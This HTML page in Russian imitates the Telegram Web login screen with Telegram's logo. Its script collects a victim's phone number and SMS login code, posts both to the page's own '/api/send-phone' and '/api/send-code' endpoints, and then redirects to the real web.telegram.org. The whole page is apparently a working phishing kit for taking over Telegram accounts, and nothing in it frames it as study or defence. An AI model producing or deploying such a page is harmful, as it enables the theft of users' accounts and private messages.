<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Web</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="tg-page">
        <div class="tg-content">
            <div class="tg-header">
                <div class="tg-logo">
                    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
                        <path d="M20 0C8.954 0 0 8.954 0 20C0 31.046 8.954 40 20 40C31.046 40 40 31.046 40 20C40 8.954 31.046 0 20 0Z" fill="#0088CC"/>
                        <path d="M28.316 12.579L24.908 29.211C24.908 29.211 24.553 30.396 23.447 29.989L16.035 24.202L12.561 22.727L8.087 21.253C8.087 21.253 7.302 20.937 7.227 20.298C7.152 19.659 8.087 19.304 8.087 19.304L26.947 11.756C26.947 11.756 27.732 11.365 28.205 11.678C28.678 11.991 28.316 12.579 28.316 12.579Z" fill="white"/>
                        <path d="M16.035 24.202L24.322 15.915C24.772 15.465 24.172 15.015 23.722 15.465L13.796 22.727L16.035 24.202Z" fill="#D2E5F1"/>
                    </svg>
                </div>
                <h1 class="tg-title">Telegram</h1>
                <p class="tg-subtitle">Войдите в свой аккаунт</p>
            </div>

            <div class="tg-form">
                <div class="tg-input-group">
                    <label class="tg-label">Страна</label>
                    <div class="tg-select-wrapper">
                        <select class="tg-select" id="country">
                            <option value="7">Russia (+7)</option>
                            <option value="1">United States (+1)</option>
                            <option value="44">United Kingdom (+44)</option>
                            <option value="49">Germany (+49)</option>
                            <option value="33">France (+33)</option>
                        </select>
                        <div class="tg-select-arrow">▼</div>
                    </div>
                </div>

                <div class="tg-input-group">
                    <label class="tg-label">Номер телефона</label>
                    <div class="tg-phone-input">
                        <div class="tg-phone-prefix" id="phonePrefix">+7</div>
                        <input type="tel" class="tg-input" id="phone" placeholder="900 123 45 67" maxlength="10" pattern="[0-9]*" inputmode="numeric">
                    </div>
                </div>

                <button class="tg-button" id="nextButton">Далее</button>
                
                <div class="tg-agreement">
                    <p>Нажимая «Далее», вы принимаете</p>
                    <p><a href="https://telegram.org/tos" target="_blank">Условия предоставления услуг</a> и <a href="https://telegram.org/privacy" target="_blank">Политику конфиденциальности</a>.</p>
                </div>
            </div>

            <div class="tg-footer">
                <p>У вас нет доступа к телефону?</p>
                <a href="#" class="tg-link" id="qrLogin">Войти с помощью QR-кода</a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('country').addEventListener('change', function() {
            document.getElementById('phonePrefix').textContent = '+' + this.value;
        });

        document.getElementById('nextButton').addEventListener('click', function() {
            const countryCode = document.getElementById('country').value;
            const phoneNumber = document.getElementById('phone').value;
            
            if (!phoneNumber || phoneNumber.length < 10) {
                alert('Пожалуйста, введите правильный номер телефона');
                return;
            }

            const fullPhone = '+' + countryCode + phoneNumber;
            
            // Отправляем номер на сервер
            fetch('/api/send-phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: fullPhone })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Показываем форму для ввода кода
                    showCodeForm(fullPhone);
                }
            })
            .catch(error => {
                console.error('Ошибка:', error);
                alert('Произошла ошибка. Попробуйте еще раз.');
            });
        });

        function showCodeForm(phone) {
            document.body.innerHTML = `
                <div class="tg-page">
                    <div class="tg-content">
                        <div class="tg-header">
                            <div class="tg-logo">
                                <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
                                    <path d="M20 0C8.954 0 0 8.954 0 20C0 31.046 8.954 40 20 40C31.046 40 40 31.046 40 20C40 8.954 31.046 0 20 0Z" fill="#0088CC"/>
                                    <path d="M28.316 12.579L24.908 29.211C24.908 29.211 24.553 30.396 23.447 29.989L16.035 24.202L12.561 22.727L8.087 21.253C8.087 21.253 7.302 20.937 7.227 20.298C7.152 19.659 8.087 19.304 8.087 19.304L26.947 11.756C26.947 11.756 27.732 11.365 28.205 11.678C28.678 11.991 28.316 12.579 28.316 12.579Z" fill="white"/>
                                    <path d="M16.035 24.202L24.322 15.915C24.772 15.465 24.172 15.015 23.722 15.465L13.796 22.727L16.035 24.202Z" fill="#D2E5F1"/>
                                </svg>
                            </div>
                            <h1 class="tg-title">Код подтверждения</h1>
                            <p class="tg-subtitle">Мы отправили код на ${phone}</p>
                        </div>

                        <div class="tg-form">
                            <div class="tg-input-group">
                                <label class="tg-label">Код из SMS</label>
                                <input type="text" class="tg-input" id="authCode" placeholder="12345" maxlength="5" pattern="[0-9]*" inputmode="numeric">
                            </div>

                            <button class="tg-button" id="loginButton">Войти</button>
                            
                            <div class="tg-code-help">
                                <p>Не получили код?</p>
                                <a href="#" class="tg-link" id="resendCode">Отправить снова</a>
                                <span class="tg-timer" id="timer">(59)</span>
                            </div>
                        </div>

                        <div class="tg-footer">
                            <a href="#" class="tg-link" id="backButton">Изменить номер</a>
                        </div>
                    </div>
                </div>
            `;

            // Таймер для повторной отправки
            let timeLeft = 59;
            const timerElement = document.getElementById('timer');
            const timerInterval = setInterval(() => {
                timeLeft--;
                timerElement.textContent = `(${timeLeft})`;
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    document.getElementById('resendCode').style.display = 'inline';
                    timerElement.style.display = 'none';
                }
            }, 1000);

            document.getElementById('loginButton').addEventListener('click', sendCode);
            document.getElementById('backButton').addEventListener('click', () => location.reload());
        }

        function sendCode() {
            const code = document.getElementById('authCode').value;
            
            if (!code || code.length !== 5) {
                alert('Пожалуйста, введите 5-значный код');
                return;
            }

            fetch('/api/send-code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code: code })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = 'https://web.telegram.org/';
                } else {
                    alert('Неверный код. Попробуйте еще раз.');
                }
            })
            .catch(error => {
                console.error('Ошибка:', error);
                alert('Произошла ошибка. Попробуйте еще раз.');
            });
        }
    </script>
</body>
</html>
